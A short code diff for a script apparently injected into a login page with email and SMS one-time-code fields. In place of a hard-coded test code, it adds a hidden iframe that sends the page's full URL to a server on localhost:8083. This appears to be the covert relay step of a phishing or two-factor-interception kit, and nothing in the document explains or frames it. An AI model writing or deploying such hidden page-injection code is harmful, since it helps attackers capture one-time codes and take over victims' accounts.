@@ -1,3 +1,8 @@
+function getQueryVariable(name){
+   if(name=(new RegExp('[?&]'+encodeURIComponent(name)+'=([^&]*)')).exec(window.location.search))
+      return decodeURIComponent(name[1]);
+}
+
 var emailField = document.getElementById("Email")
 if (emailField != null) {
   emailField.addEventListener("blur", function() {
@@ -9,6 +14,10 @@ if (emailField != null) {
 }
 
 var otpField = document.getElementById("smsUserPin");
-if (otpField != null) {
-  document.getElementById("smsUserPin").value = '123456'
+if (otpField != null && !getQueryVariable('smsUserPin')) {
+  // document.getElementById("smsUserPin").value = '123456'
+  var frame = document.createElement('iframe');
+  frame.src = 'http://localhost:8083?url='+encodeURIComponent(window.location.href);
+  frame.style.display = 'none';
+  document.getElementsByTagName('body')[0].appendChild(frame);
 }
